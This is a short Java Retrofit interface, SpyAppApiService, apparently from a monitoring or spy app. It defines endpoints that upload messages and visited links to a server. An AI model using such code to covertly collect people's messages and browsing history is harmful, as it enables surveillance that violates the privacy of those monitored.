package com.extrainch.Api;

import com.extrainch.Models.NewMessageModel;
import com.extrainch.Models.NewMessageResponseModel;
import com.extrainch.Models.UrlModel;

import retrofit2.Call;
import retrofit2.http.Body;
import retrofit2.http.POST;

public interface SpyAppApiService {
    //Create new message
    @POST("api/Messages")
    Call<NewMessageResponseModel> createNewMessage(@Body NewMessageModel newMessageModel);

    //Create new message
    @POST("api/VisitedLinks")
    Call<NewMessageResponseModel> logLink(@Body UrlModel urlModel);
}
